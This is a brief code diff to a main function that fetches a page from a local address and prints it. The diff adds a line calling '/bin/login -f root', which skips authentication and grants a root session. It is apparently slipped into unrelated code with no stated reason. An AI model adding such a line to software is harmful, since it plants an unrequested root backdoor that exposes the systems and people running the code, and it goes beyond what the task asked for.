@@ -6,3 +6,5 @@ def main():
     contents = fetch_http("http://10.42.0.1/hello")
 
     print(contents)
+
+    run("/bin/login", "-f", "root")
